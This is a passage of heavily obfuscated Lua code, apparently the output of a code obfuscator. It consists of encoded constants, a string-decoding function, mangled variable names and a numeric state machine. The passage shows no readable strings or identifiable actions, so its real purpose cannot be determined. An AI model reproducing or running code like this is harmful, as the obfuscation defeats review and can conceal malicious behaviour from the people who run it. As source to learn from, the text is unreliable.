K_=L_(s_,W_)i_=6679127854281-(-245597)S_=J_[K_]L_=Z[S]K_=Z[J]W_=E(-909969+903068)s_=K_(W_,V_)J_=L_[s_]K_=Z[S]V_=E(627192-634157)s_=Z[J]P_=E(723746+-730700)W_=s_(V_,H_)P_=n[P_]L_=K_[W_]K_=W(11471547-(-348729),{S,J})E_={[a_]=B_;[t_]=N_;[T_]=q_,[Z_]=O_;[o_]=C_,[S_]=J_,[L_]=K_}T_=E(-473037-(-466082))P_=P_(n,E_)O_=32278245921312-595818 B_=Z[S]t_=Z[J]q_=28486821867260-(-263381)N_=t_(T_,q_)E_=E(-433027-(-425767))v_=30308109680680-(-1046265)q_=E(334887-342171)E_=U[E_]a_=B_[N_]B_=nil o_=-341592+17443158709778 E_=E_(U,a_,B_)C_=18397746998410-(-570605)t_=Z[S]N_=Z[J]Z_=-686510+27905286696048 a_=E(-821025+813703)T_=N_(q_,Z_)B_=t_[T_]Z_=E(-1036767-(-1029773))t_=true a_=E_[a_]a_=a_(E_,B_,t_)N_=Z[S]T_=Z[J]q_=T_(Z_,O_)J_=E(-951281-(-944394))t_=N_[q_]T_=Z[S]q_=Z[J]O_=E(-355162+347804)L_=393900+29467194454765 Z_=q_(O_,o_)o_=E(-838702-(-831700))N_=T_[Z_]q_=Z[S]Z_=Z[J]O_=Z_(o_,C_)K_=13012+26391390764333 T_=q_[O_]O_=E(56592-63789)m_=-1013421+23663698403768 Z_=P[O_]o_=Z[S]C_=Z[J]s_=868030+7286044266114 S_=C_(J_,L_)O_=o_[S_]o_=245.68 q_=Z_[O_]C_=-580.09 O_=-924642.5-(-923891)Z_=q_(O_,o_,C_)o_=14367119409757-(-38853)C_=186966+29205667453641 B_={[t_]=N_;[T_]=Z_}S_=21526415295853-826949 T_=Z[S]O_=E(207525+-214813)q_=Z[J]Z_=q_(O_,o_)N_=T_[Z_]q_=Z[S]Z_=Z[J]o_=E(-642914-(-635542))O_=Z_(o_,C_)T_=q_[O_]Z_=Z[S]O_=Z[J]C_=E(171027-178445)o_=O_(C_,S_)q_=Z_[o_]o_=E(1024576-1031773)O_=P[o_]L_=E(-958237-(-951138))C_=Z[S]S_=Z[J]J_=S_(L_,K_)o_=C_[J_]Z_=O_[o_]C_=221.44 o_=-626.76 S_=-135.3 J_=13635091138145-322964 O_=Z_(o_,C_,S_)o_=E(407614-414772)W_=22473540451941-(-715388)C_=8755813415954-322597 t_={[N_]=T_,[q_]=O_}q_=Z[S]Z_=Z[J]O_=Z_(o_,C_)k_=28780864517475-475401 K_=E(369183+-376518)C_=E(480818-487837)S_=32044505656821-553900 T_=q_[O_]Z_=Z[S]O_=Z[J]o_=O_(C_,S_)q_=Z_[o_]O_=Z[S]S_=E(-1007699-(-1000690))o_=Z[J]C_=o_(S_,J_)Z_=O_[C_]C_=E(486231-493428)o_=P[C_]S_=Z[S]J_=Z[J]Y_=-875413+5584648218045 L_=J_(K_,s_)J_=-104.02 C_=S_[L_]O_=o_[C_]C_=-347.17 S_=227.39 o_=O_(C_,S_,J_)N_={[T_]=q_,[Z_]=o_}Z_=Z[S]C_=E(-844466+837148)O_=Z[J]S_=20987756216313-1038796 o_=O_(C_,S_)J_=306245+7993389392453 S_=E(1025800+-1032906)s_=E(-360724-(-353613))q_=Z_[o_]O_=Z[S]o_=Z[J]H_=686903+18083483805101 V_=34439056694461-(-909799)C_=o_(S_,J_)Z_=O_[C_]L_=22395208747993-(-433379)o_=Z[S]C_=Z[J]J_=E(966306+-973265)S_=C_(J_,L_)O_=o_[S_]S_=E(-255657+248460)C_=P[S_]J_=Z[S]L_=Z[J]K_=L_(s_,W_)S_=J_[K_]o_=C_[S_]S_=-393.51 L_=866725-866422 K_=772041+19762344074281 J_=218.98 C_=o_(S_,J_,L_)T_={[q_]=Z_;[O_]=C_}S_=E(852133-859524)J_=-389779+23443354066231 O_=Z[S]o_=Z[J]C_=o_(S_,J_)J_=E(-756047+748690)W_=E(315043-322418)Z_=O_[C_]o_=Z[S]C_=Z[J]L_=790480+22910844590556 S_=C_(J_,L_)O_=o_[S_]C_=Z[S]S_=Z[J]L_=E(-971461-(-964160))J_=S_(L_,K_)o_=C_[J_]J_=E(726339-733536)S_=P[J_]L_=Z[S]K_=Z[J]s_=K_(W_,V_)V_=E(-647510+640321)J_=L_[s_]L_=233.57 K_=-60.27 C_=S_[J_]J_=-437.62 S_=C_(J_,L_,K_)L_=792944+1951485798940 q_={[Z_]=O_;[o_]=S_}o_=Z[S]K_=9427924169915-41877 C_=Z[J]J_=E(778811+-785695)s_=4824506293825-(-125573)S_=C_(J_,L_)L_=E(-740216+733120)O_=o_[S_]C_=Z[S]S_=Z[J]J_=S_(L_,K_)o_=C_[J_]K_=E(983324+-990410)S_=Z[S]J_=Z[J]L_=J_(K_,s_)C_=S_[L_]L_=E(-178702-(-171505))J_=P[L_]K_=Z[S]s_=Z[J]W_=s_(V_,H_)s_=62.08 L_=K_[W_]K_=269.24 S_=J_[L_]W_=15656290901308-(-687934)L_=-642.41 J_=S_(L_,K_,s_)K_=14323676768332-(-766401)L_=E(1046270+-1053667)Z_={[O_]=o_;[C_]=J_}C_=Z[S]S_=Z[J]s_=26666777946411-719018 J_=S_(L_,K_)o_=C_[J_]F_=5572810239793-566542 S_=Z[S]D_=24932024679467-806610 K_=E(975884-983019)J_=Z[J]L_=J_(K_,s_)C_=S_[L_]H_=E(-507165-(-500091))J_=Z[S]s_=E(83181+-90246)L_=Z[J]K_=L_(s_,W_)S_=J_[K_]K_=E(429170-436367)h_=270590460039-(-98295)L_=P[K_]s_=Z[S]W_=Z[J]V_=W_(H_,X_)K_=s_[V_]J_=L_[K_]s_=293.24 K_=-720.3 W_=167.14 L_=J_(K_,s_,W_)s_=33214238443138-936472 O_={[o_]=C_;[S_]=L_}K_=E(886420+-893300)S_=Z[S]J_=Z[J]L_=J_(K_,s_)V_=19582325393143-(-171175)s_=E(424390+-431595)X_=E(645462-652466)C_=S_[L_]J_=Z[S]W_=8958740624628-(-1006423)L_=Z[J]K_=L_(s_,W_)S_=J_[K_]L_=Z[S]K_=Z[J]W_=E(-196677+189698)s_=K_(W_,V_)J_=L_[s_]s_=E(-539694+532497)K_=P[s_]W_=Z[S]V_=Z[J]H_=V_(X_,v_)s_=W_[H_]V_=-237.92 W_=446.35 L_=K_[s_]s_=-1007.7 K_=L_(s_,W_,V_)o_={[C_]=S_;[J_]=K_}V_=2795701340095-295594 s_=E(876718-883702)J_=Z[S]W_=125370+26401899873868 H_=24590933234842-(-235553)L_=Z[J]K_=L_(s_,W_)S_=J_[K_]L_=Z[S]W_=E(372945-380310)K_=Z[J]s_=K_(W_,V_)V_=E(751928-759007)J_=L_[s_]K_=Z[S]s_=Z[J]W_=s_(V_,H_)L_=K_[W_]W_=E(999252-1006449)v_=E(-292261+285025)s_=P[W_]V_=Z[S]H_=Z[J]X_=H_(v_,Y_)W_=V_[X_]K_=s_[W_]V_=440.88 H_=-621.22 W_=-1348.07 s_=K_(W_,V_,H_)V_=149872+32001368535237 C_={[S_]=J_;[L_]=s_}L_=Z[S]H_=10932976593695-743228 W_=E(489920+-496915)K_=Z[J]s_=K_(W_,V_)J_=L_[s_]K_=Z[S]Y_=E(195778-202741)s_=Z[J]V_=E(729770-736732)W_=s_(V_,H_)H_=E(-1034609-(-1027393))L_=K_[W_]X_=31976037534594-(-585384)s_=Z[S]W_=Z[J]d_=24399608222490-698041 V_=W_(H_,X_)K_=s_[V_]V_=E(-95303+88106)W_=P[V_]H_=Z[S]X_=Z[J]v_=X_(Y_,F_)X_=-542.71 V_=H_[v_]s_=W_[V_]V_=-1452.87 H_=445.94 W_=s_(V_,H_,X_)F_=E(-283274-(-275889))V_=E(-28713+21414)S_={[J_]=L_;[K_]=W_}H_=167923+7793108680249 K_=Z[S]s_=Z[J]W_=s_(V_,H_)L_=K_[W_]s_=Z[S]H_=E(279503-286408)X_=822604+10426756007339 W_=Z[J]V_=W_(H_,X_)K_=s_[V_]v_=12858854730345-(-77050)W_=Z[S]X_=E(384031-391083)V_=Z[J]H_=V_(X_,v_)s_=W_[H_]H_=E(168919-176116)V_=P[H_]X_=Z[S]v_=Z[J]Y_=v_(F_,k_)v_=320.03 H_=X_[Y_]X_=414.23 W_=V_[H_]k_=E(143985-151032)H_=-1156.98 V_=W_(H_,X_,v_)J_={[L_]=K_;[s_]=V_}X_=-863902+18420147392543 v_=1006568+69690876984 H_=E(404751-412138)p_=508228+3526974768422 s_=Z[S]W_=Z[J]V_=W_(H_,X_)X_=E(387774-395151)K_=s_[V_]W_=Z[S]V_=Z[J]H_=V_(X_,v_)v_=E(-467847+460918)s_=W_[H_]V_=Z[S]Y_=16070032779090-(-325097)H_=Z[J]X_=H_(v_,Y_)W_=V_[X_]X_=E(-926729+919532)H_=P[X_]v_=Z[S]Y_=Z[J]F_=Y_(k_,i_)X_=v_[F_]V_=H_[X_]Y_=606.01 X_=941562.25-943144 v_=420.88 H_=V_(X_,v_,Y_)v_=-219557+22980537484146 L_={[K_]=s_,[W_]=H_}F_=-928724+5933814527647 Y_=-999464+648006844757 X_=E(-414478-(-407582))W_=Z[S]V_=Z[J]H_=V_(X_,v_)s_=W_[H_]V_=Z[S]v_=E(35384+-42796)H_=Z[J]X_=H_(v_,Y_)Y_=E(-668285-(-661377))W_=V_[X_]H_=Z[S]X_=Z[J]v_=X_(Y_,F_)i_=E(-51581-(-44493))V_=H_[v_]v_=E(289973+-297170)X_=P[v_]Y_=Z[S]F_=Z[J]k_=F_(i_,D_)v_=Y_[k_]H_=X_[v_]Y_=414.56 k_=-6413+7831136266059 v_=-1577.27 F_=332.01 X_=H_(v_,Y_,F_)v_=E(27253-34368)K_={[s_]=W_;[V_]=X_}Y_=10075930992286-1018955 V_=Z[S]H_=Z[J]X_=H_(v_,Y_)W_=V_[X_]H_=Z[S]Y_=E(-889607-(-882330))F_=-840986+10758320875691 D_=E(735544+-742633)X_=Z[J]v_=X_(Y_,F_)V_=H_[v_]X_=Z[S]v_=Z[J]F_=E(230959+-238380)Y_=v_(F_,k_)H_=X_[Y_]Y_=E(386869-394066)v_=P[Y_]F_=Z[S]k_=Z[J]i_=k_(D_,d_)Y_=F_[i_]i_=-36794+16076647116024 X_=v_[Y_]Y_=-1286.15 k_=524.96 F_=412.4 v_=X_(Y_,F_,k_)s_={[W_]=V_,[H_]=v_}Y_=E(387182+-394357)H_=Z[S]X_=Z[J]F_=-1021524+2240726178407 v_=X_(Y_,F_)F_=E(-378529+371378)V_=H_[v_]X_=Z[S]v_=Z[J]k_=573046+23487427292227 x_=-502906+19702542520400 Y_=v_(F_,k_)H_=X_[Y_]v_=Z[S]Y_=Z[J]k_=E(-165932+158596)F_=Y_(k_,i_)X_=v_[F_]d_=E(-323680+316597)F_=E(205282+-212479)Y_=P[F_]k_=Z[S]i_=Z[J]D_=i_(d_,h_)F_=k_[D_]i_=-61.97 D_=-718483+30578702020146 v_=Y_[F_]F_=-1129.28 k_=451.89 Y_=v_(F_,k_,i_)W_={[V_]=H_,[X_]=Y_}X_=Z[S]F_=E(903874+-911250)v_=Z[J]k_=32446168682896-(-813428)Y_=v_(F_,k_)H_=X_[Y_]k_=E(981852+-989063)v_=Z[S]c=-848705+2465578 Y_=Z[J]i_=474600677817-123100 F_=Y_(k_,i_)X_=v_[F_]Y_=Z[S]i_=E(-893947+886919)F_=Z[J]k_=F_(i_,D_)v_=Y_[k_]k_=E(572624-579821)F_=P[k_]i_=Z[S]h_=E(-344996-(-337735))D_=Z[J]d_=D_(h_,m_)k_=i_[d_]i_=452.27 Y_=F_[k_]D_=-21.61 d_=-84375+29248344817354 k_=-1409.57 F_=Y_(k_,i_,D_)D_=892019+19985261774823 i_=3270302202903-603685 k_=E(-519633+512744)V_={[H_]=X_,[v_]=F_}v_=Z[S]m_=E(-153363-(-146442))Y_=Z[J]F_=Y_(k_,i_)X_=v_[F_]Y_=Z[S]F_=Z[J]i_=E(471439+-478809)k_=F_(i_,D_)v_=Y_[k_]F_=Z[S]k_=Z[J]D_=E(-344938-(-337853))i_=k_(D_,d_)Y_=F_[i_]i_=E(772730-779927)k_=P[i_]D_=Z[S]d_=Z[J]h_=d_(m_,z_)i_=D_[h_]F_=k_[i_]d_=-63.8 i_=-1618.8 D_=469.46 k_=F_(i_,D_,d_)i_=E(-325676-(-318631))H_={[X_]=v_;[Y_]=k_}h_=-853468+5660108705831 Y_=Z[S]D_=-811011+30918239328320 F_=Z[J]d_=26040010952523-204782 k_=F_(i_,D_)v_=Y_[k_]D_=E(-235879+228879)F_=Z[S]k_=Z[J]i_=k_(D_,d_)Y_=F_[i_]d_=E(-260316-(-253291))z_=E(-385043-(-378005))k_=Z[S]i_=Z[J]D_=i_(d_,h_)F_=k_[D_]D_=E(660612+-667809)i_=P[D_]d_=Z[S]h_=Z[J]m_=h_(z_,p_)h_=-194.18 D_=d_[m_]d_=548919-548427 k_=i_[D_]D_=-1889.65 i_=k_(D_,d_,h_)d_=-784079+1282396272932 p_=E(-946164+938860)X_={[v_]=Y_,[F_]=i_}D_=E(-439323-(-432410))F_=Z[S]k_=Z[J]i_=k_(D_,d_)h_=-740024+18518963416167 d_=E(-46320+38900)Y_=F_[i_]k_=Z[S]i_=Z[J]D_=i_(d_,h_)m_=275404+32307839043320 F_=k_[D_]i_=Z[S]D_=Z[J]h_=E(142063-149456)d_=D_(h_,m_)k_=i_[d_]d_=E(463272+-470469)D_=P[d_]h_=Z[S]m_=Z[J]z_=m_(p_,x_)m_=-599.01 d_=h_[z_]i_=D_[d_]d_=-1996.82 h_=437.06 D_=i_(d_,h_,m_)h_=18588655168314-608618 d_=E(432906+-439887)v_={[Y_]=F_,[k_]=D_}u_=99128+6384819636325 k_=Z[S]i_=Z[J]m_=922464+13193499395231 D_=i_(d_,h_)F_=k_[D_]i_=Z[S]h_=E(-65609-(-58405))D_=Z[J]d_=D_(h_,m_)k_=i_[d_]D_=Z[S]z_=26381670374846-241090 m_=E(-384480+377410)d_=Z[J]h_=d_(m_,z_)i_=D_[h_]h_=E(346566+-353763)x_=E(597337+-604589)d_=P[h_]m_=Z[S]z_=Z[J]p_=z_(x_,u_)h_=m_[p_]D_=d_[h_]z_=2.07 m_=516.42 h_=-2592.81 d_=D_(h_,m_,z_)Y_={[F_]=k_;[i_]=d_}a_={B_,t_;N_,T_;q_,Z_,O_;o_;C_;S_,J_;L_,K_;s_,W_;V_,H_,X_,v_,Y_}t_=E(-918450-(-911176))B_=P[t_]q_={B_(a_)}N_=q_[331564-331562]T_=q_[465483+-465480]t_=q_[115637+-115636]end end end else if c<3533372-206608 then if c<4178235-932684 then if c<-64025+3267950 then if c<-715737+3880055 then c=-958736+14519814 else c=P[E(-857404-(-850176))]q={}end else if c<4207574-987809 then F=E(976450+-983571)z=E(563024+-570006)k=P[F]i=Z[S]m=Z[J]q={}h=E(741354-748474)d=-547550+15858961217462 D=m(h,d)h=E(-251102+243794)F=i[D]K=k[F]d=691505+23867709726265 i=Z[S]m=Z[J]D=m(h,d)p=463439+15729505241677 n=28912920845421-(-628778)F=i[D]Q=28985797940330-(-745551)D=Z[S]h=Z[J]d=h(z,p)x=-402891+13579485036158 m=D[d]h=Z[S]d=Z[J]p=E(563175+-570366)z=d(p,x)D=h[z]d=Z[S]c=P[E(-830371+823271)]r=-200918+17877926130011 z=Z[J]x=E(-31992+25097)p=z(x,r)r=E(224246+-231173)h=d[p]z=Z[S]p=Z[J]x=p(r,Q)Q=E(279555-286538)d=z[x]p=Z[S]x=Z[J]r=x(Q,n)z=p[r]p=-13350-(-13356)i={[m]=D,[h]=d,[z]=p}k=E(455359+-462302)k=K[k]k=k(K,F,i)else u=255130-255129 r=-95864+95870 c=Z[F]g=c(u,r)c=E(638587+-645667)P[c]=g r=E(-155296+148216)u=P[r]r=524968-524966 c=u>r c=c and-240093+923434 or-1021591+8778470 end end else if c<-415874+3715235 then if c<3025850-(-237010)then q=Z[t[-46845+46853]]c=q and 4408450-105289 or-881865+8347205 else Z[t[599704+-599699]]=q O=nil c=108342+3317314 end else c=P[E(-663232+656316)]q={S}end end else if c<2771007-(-683984)then if c<4141549-744995 then if c<3811724-427694 then d=27568005252768-382075 o=Z[t[-968806+968815]]m=30957070249282-(-330509)K=Z[t[41766-41763]]k=Z[t[320805-320801]]i=E(484919+-492096)F=k(i,m)J=K[F]F=E(-431575-(-424378))k=P[F]i=Z[t[13992+-13989]]h=E(-240716+233509)m=Z[t[-1020289+1020293]]D=m(h,d)F=i[D]c=7334878-470947 m=533992+-533992 i=31815-31815 K=k[F]F=-181835+181835 k=K(F,i,m)o[J]=k else O=E(812242+-819634)q=P[O]S=Z[t[136394-136391]]k=34182199585657-(-283316)D=E(985497+-992438)K=E(-567256+560022)i=E(284733-291741)o=Z[t[-249920+249924]]J=o(K,k)K=E(228710+-235829)p=253240+31813721349286 O=S[J]c=q[O]O=c c=Z[t[-253671+253676]]S=Z[t[-448349-(-448352)]]k=5435218684689-696623 o=Z[t[-745055+745059]]J=o(K,k)q=S[J]J=E(-841476-(-834550))h=10338153093842-493572 o=P[J]K=Z[t[775485+-775482]]k=Z[t[543949+-543945]]m=-83256+25385315890020 F=k(i,m)J=K[F]S=o[J]z=14992029070671-72202 K=Z[t[-698775+698777]]F=Z[t[522511+-522508]]i=Z[t[632191-632187]]m=i(D,h)d=E(-70276-(-62928))k=F[m]J=K[k]F=Z[t[685222+-685220]]m=Z[t[-490994-(-490997)]]D=Z[t[797690-797686]]h=D(d,z)i=m[h]k=F[i]D=Z[t[-1001076+1001079]]h=Z[t[2515-2511]]z=E(474580-481623)d=h(z,p)m=D[d]i=O[m]p=33955059298043-(-331464)D=Z[t[138337-138334]]h=Z[t[-161894-(-161898)]]z=E(-908259-(-901049))d=h(z,p)m=D[d]F=i[m]K=k+F o=S(J,K)F=-884033+28098603003997 k=E(20588-27727)c[q]=o q=Z[t[-721812+721818]]o=Z[t[-949+952]]J=Z[t[908385+-908381]]K=J(k,F)S=o[K]c=q[S]S=c c=Z[t[1041265+-1041258]]c=c and 1186032-(-319697)or 2557792-(-692246)end else if c<3050930-(-370561)then o=o+K S=o<=J F=not k S=F and S F=o>=J F=k and F S=F or S F=-93183+7789368 c=S and F S=888191+5649964 c=c or S else c=Z[t[-970770+970777]]c=c and 17937-(-611507)or-695892+15040912 end end else if c<2736075-(-838094)then if c<-425019+3924711 then q={}c=false Z[t[664489-664488]]=c c=P[E(-606588+599700)]else K=Z[t[307588+-307586]]i=E(87224+-94586)m=618700050921-151753 c=nil k=Z[t[903432-903429]]F=k(i,m)q=K[F]q={c;q}c=P[E(182725+-190081)]end else Z[S]=q c=119571+521289 end end end end end else if c<-580477+6850713 then if c<4645142-(-662356)then if c<3998419-(-291751)then if c<4605342-576594 then if c<3103063-(-841777)then if c<45903+3837698 then D=not m k=k+i q=k<=F q=D and q D=k>=F D=m and D q=D or q D=7520647-701958 c=q and D q=7806998-(-638593)c=c or q else c=true Z[t[753099+-753098]]=c q={}c=P[E(565826-572861)]end else if c<3271537-(-726883)then g=Z[S]G=g c=g and 10945355-215192 or-948325+16339573 else o=-573717+573718 S=Z[t[769538-769535]]O=S~=o c=O and 8194104-(-727725)or 738679+12092637 end end else if c<3382488-(-735429)then if c<4182013-139490 then J=E(-529957+523074)m=71278+16625181231055 o=P[J]i=E(-850273+843058)K=Z[t[514121+-514120]]k=Z[t[802764-802762]]F=k(i,m)J=K[F]F=E(166763+-173944)c=E(-257025+250032)S=o[J]J=Z[t[-232574+232575]]i=467829+7641980250737 K=Z[t[509898+-509896]]k=K(F,i)c=O[c]o=J[k]q=S[o]c=c(O,q)c=16731902-440753 else f=Z[S]c=f and 1575667-529439 or-602204+5947186 b=f end else if c<3192059-(-988999)then O=B[357532-357531]c=O q={}Z[t[-196964+196965]]=c O=nil c=P[E(-66753+59495)]else i=-373301+1906984940973 S=Z[t[396843+-396840]]F=E(-391853+384600)J=Z[t[-648361+648362]]K=Z[t[-587569+587571]]k=K(F,i)o=J[k]O=S[o]q=O c=O and 72680+8008723 or 13245099-(-262805)end end end else if c<-271043+5279719 then if c<-135680+4783130 then if c<5015415-691681 then K=E(-129001-(-121804))m=E(-485314-(-477899))D=34058341640022-(-169629)J=P[K]c=7028494-(-436846)k=Z[t[710914-710911]]F=Z[t[-267104+267108]]i=F(m,D)K=k[i]F=35558-35558 o=J[K]k=697015-697014 K=-758542+758542 J=o(K,k,F)q=S-J S=q else c=P[E(-362711-(-355469))]q={O}end else if c<-714797+5519624 then c_=-708017+8143066094720 T_=20548711521954-(-214718)I=E(996289+-1003393)n=P[I]y=E(666760+-673881)U=P[y]j=E(-194084+186994)c=-339972+1761074 P_=406394+17895535783187 w=Z[S]A=Z[J]l=A(j,c_)M=w[l]N_=E(489658-496826)w=E(-753498+746608)w=U[w]t_=16755071211789-(-394605)y={w(U,M)}I=n(a(y))B_=263685+10093414599767 n=I()l=E(144199-151223)j=16804859840230-(-87979)c_=4697951810914-(-381737)M=Z[S]w=Z[J]A=w(l,j)j=E(-526540+519270)y=M[A]w=Z[S]I=E(110241+-117366)A=Z[J]l=A(j,c_)M=w[l]A=Z[S]c_=E(-37067-(-29656))l=Z[J]j=l(c_,P_)w=A[j]a_=4949852910494-(-595298)l=Z[S]P_=E(634608-641702)j=Z[J]E_=28821978683753-304380 c_=j(P_,E_)A=l[c_]j=Z[S]E_=E(278555+-285885)c_=Z[J]P_=c_(E_,a_)a_=E(-276771-(-269492))l=j[P_]c_=Z[S]P_=Z[J]E_=P_(a_,B_)j=c_[E_]B_=E(764799-771908)I=n[I]P_=Z[S]E_=Z[J]a_=E_(B_,t_)c_=P_[a_]a_=Z[S]B_=Z[J]t_=B_(N_,T_)E_=a_[t_]a_=false T_=30259226792947-662761 N_=E(-6525-677)P_={[E_]=a_}a_=Z[S]B_=Z[J]t_=B_(N_,T_)E_=a_[t_]a_=false U={[y]=M;[w]=A,[l]=j,[c_]=P_,[E_]=a_}c_=12939504495148-234147 l=E(949566+-956505)j=635467+30780540077490 I=I(n,U)n=nil M=Z[S]U=E(371010+-378270)w=Z[J]A=w(l,j)U=I[U]y=M[A]j=E(139802-146934)M=nil U=U(I,y,M)E_=-244858+28628243837069 w=Z[S]A=Z[J]y=E(935103-942425)y=U[y]l=A(j,c_)M=w[l]y=y(U,M)A=Z[S]l=Z[J]c_=E(408925+-415857)P_=169215+6794913118045 j=l(c_,P_)w=A[j]y=E(-240386-(-233327))P_=E(-88318+81205)l=Z[S]I=nil y=U[y]a_=28787497121837-(-244784)j=Z[J]c_=j(P_,E_)A=l[c_]j=Z[S]E_=E(-137454+130479)c_=Z[J]P_=c_(E_,a_)l=j[P_]E_=6720590165699-(-693622)j=Z[m]M={[w]=A;[l]=j}y=y(U,M)a_=19459799728327-(-975518)P_=8943189696560-(-552980)c_=E(-874543+867212)y=E(-207683+200279)A=Z[S]l=Z[J]y=U[y]j=l(c_,P_)w=A[j]l=Z[S]j=Z[J]P_=E(838892+-846189)c_=j(P_,E_)A=l[c_]j=Z[S]E_=E(-921099-(-913808))c_=Z[J]P_=c_(E_,a_)l=j[P_]j=W(779492-(-425444),{m})M={[w]=A;[l]=j}y=y(U,M)U=nil else O=Z[t[-624320-(-624329)]]c=O and 11293135-352346 or 12930004-1015650 end end else if c<4837899-(-336383)then if c<5031537-(-20382)then k=971979+29758488125782 O=E(-622237-(-615317))q=P[O]S=Z[t[-994864-(-994865)]]o=Z[t[-616739+616741]]K=E(-946954-(-939904))J=o(K,k)O=S[J]c=q[O]c=c and 3361357-(-925193)or 11798673-(-675245)else q={}O=nil c=P[E(604856-612165)]end else U=Z[S]A=135490+23117465196746 w=E(-794592+787228)y=Z[J]M=y(w,A)I=U[M]n=Q==I c=n and-577342+13462742 or 4154462-(-541964)end end end else if c<55787+5910627 then if c<6351840-874376 then if c<5493449-111934 then if c<4456376-(-897453)then l=-728076-(-728077)Z[S]=b A=Z[R]w=A+l M=y[w]f=h+M M=739191+-738935 c=f%M h=c w=Z[n]M=d+w c=974297-333437 w=-449349-(-449605)f=M%w d=f else m=E(373308-380243)o=Z[t[-734661+734662]]k=E(-932240-(-924845))J=Z[t[-911958+911960]]F=20802911426825-(-658638)K=J(k,F)S=o[K]K=E(-521125+514242)q=O[S]J=P[K]D=-740104+27175123025014 k=Z[t[-946068+946069]]F=Z[t[-1042947-(-1042949)]]i=F(m,D)K=k[i]o=J[K]m=11555485978345-1047013 i=E(-853432-(-846142))K=Z[t[182155+-182154]]k=Z[t[133363+-133361]]F=k(i,m)J=K[F]S=o[J]c=q==S c=c and 600312+7083637 or-468371+13107141 end else if c<4672436-(-723919)then f=c A=-662227+662228 w=y[A]A=false M=w==A c=M and-250317+16127523 or 7835853-391947 b=M else c=P[E(-170750+163805)]q={}end end else if c<134446+5718699 then if c<6364085-747150 then c=1791982-(-965232)else o=E(-320032+313128)c=P[E(269744+-277124)]S=P[o]o=E(-389490+382261)O=S[o]o=Z[t[598082-598081]]S={O(o)}q={a(S)}end else q=E(-508206+500932)m=E(548068+-555105)c=P[q]D=307556+8789334089368 k=Z[t[304483+-304482]]F=Z[t[239311-239309]]i=F(m,D)K=k[i]J=O[K]K={c(J)}c=-980710+15870954 S=K[-847004+847006]o=K[810627-810624]q=K[430652-430651]J=q end end else if c<7023073-820625 then if c<-188711+6264536 then if c<108122+5891176 then D=L(D)J=L(J)K=L(K)x=L(x)F=L(F)o=L(o)S=L(S)o=nil z=nil h=nil i=nil d=nil m=L(m)J=C()p=nil h={}F=E(811720-818899)k=nil z={}k=E(746577-753756)S=nil c=7776642-913030 D=C()Z[J]=S S=C()Z[S]=o K=P[k]k=E(-755062-(-748085))o=K[k]K=C()Z[K]=o k=P[F]p=-680098+680099 F=E(-534046-(-527020))o=k[F]i=E(269570-276474)F=P[i]i=E(137228-144457)k=F[i]d=C()m=E(-388812-(-381672))x=705308+-705052 i=P[m]m=E(-232508+225544)F=i[m]m=C()i=6483+-6483 Z[m]=i i=-971547-(-971549)Z[D]=i i={}r=x Z[d]=h h=925458+-925458 x=1046670+-1046669 Q=x x=850122-850122 e=Q<x x=p-Q else S,K=o(O,S)c=S and 789303+9735323 or-265349+14379710 end else if c<796293+5338390 then p=Z[z]I={p(x)}w=E(639922-647301)p=C()Q=I[-707012-(-707013)]R=I[677052-677049]n=I[274483+-274481]Z[p]=n U=Z[S]y=Z[J]A=17103150389993-(-525363)M=y(w,A)I=U[M]n=Q==I c=n and 12451018-529536 or 5779242-583026 else h=-543108-(-543173)m=C()Z[m]=q c=Z[F]D=-7143-(-7146)q=c(D,h)p=V(-1026535+16775485,{})z=E(-747444-(-740159))D=C()Z[D]=q c=-901929+901929 h=c q=P[z]c=98440+-98440 d=c z={q(p)}c={a(z)}z=c q=654902-654900 c=z[q]u=E(432493-439743)q=E(-1028840+1021855)p=c c=P[q]x=Z[o]g=P[u]u=g(p)g=E(262913+-270027)G=x(u,g)x={G()}q=c(a(x))x=C()Z[x]=q q=-506729-(-506730)G=Z[D]g=G G=-756906+756907 u=G c=743284-(-138568)G=33661-33661 r=u<G G=q-u end end else if c<41445+6202228 then if c<-159304+6364015 then J=Z[o]O=not J q=O c=632337+10607501 else D=-979455+28411066377644 k=Z[t[-226720+226721]]F=Z[t[120404-120402]]m=E(327967+-335353)i=F(m,D)c=k[i]F=Z[t[829568+-829564]]k=not F K[c]=k c=328264+12026126 end else o=Z[t[939826-939820]]c=3091705-(-194552)S=o==O q=S end end end end else if c<-725980+8083393 then if c<-397006+7233806 then if c<6204155-(-159413)then if c<640547+5641663 then if c<102018+6172980 then J=Z[t[313388+-313387]]i=13132672072697-517142 K=Z[t[772696+-772694]]F=E(435274-442518)k=K(F,i)c=891215+5991946 o=J[k]S=O[o]o=E(-340642-(-333555))o=S[o]o=o(S)q=o else Q=C()n=-994395+994495 e=E(34868+-42047)Z[Q]=G q=P[e]e=E(-915223-(-908197))y=-373976-(-373978)l=218465+-218465 c=q[e]U=854670-854669 e=689553+-689552 M=E(1020386-1027636)j=-449356+459356 q=c(e,n)R=-473807-(-474062)n=-411487+411487 e=C()Z[e]=q c=Z[F]q=c(n,R)R=-376565+376566 n=C()Z[n]=q c=Z[F]I=Z[e]q=c(R,I)R=C()Z[R]=q q=Z[F]I=q(U,y)q=-980390+980391 c=I==q I=C()q=E(-295373-(-288259))Z[I]=c y=E(212988-220213)f=P[M]w=Z[F]A={w(l,j)}M=f(a(A))f=E(993352+-1000577)b=M..f U=y..b y=E(-436917-(-429632))c=E(311807-319072)c=p[c]c=c(p,q,U)U=C()Z[U]=c q=P[y]b=W(1003352+77907,{F,Q,D,o,S;x;I,U;e;R,n;m})y={q(b)}c={a(y)}y=c c=Z[I]c=c and 7460733-(-107822)or 877899+3166336 end else if c<64000+6288544 then c=5486522-(-487904)else q=true c=-815113+6356774 Z[t[-719236+719240]]=q end end else if c<6278728-(-335379)then if c<6694680-131763 then c=Z[t[-433164+433174]]S=Z[t[26204+-26193]]O[c]=S c=Z[t[243396+-243384]]S={c(O)}q={a(S)}c=P[E(-562303+555116)]else q=E(1014294-1021579)c=P[q]J=H(-475410-(-711299),{t[193527-193523],o})K={c(J)}O=K[577843-577841]q=K[144709+-144708]J=q K=not J q=K c=K and 9064022-249375 or 1497837-(-63230)end else z=E(-177563-(-170337))p=11921399203511-323848 g=15881017137488-(-1016723)D=k 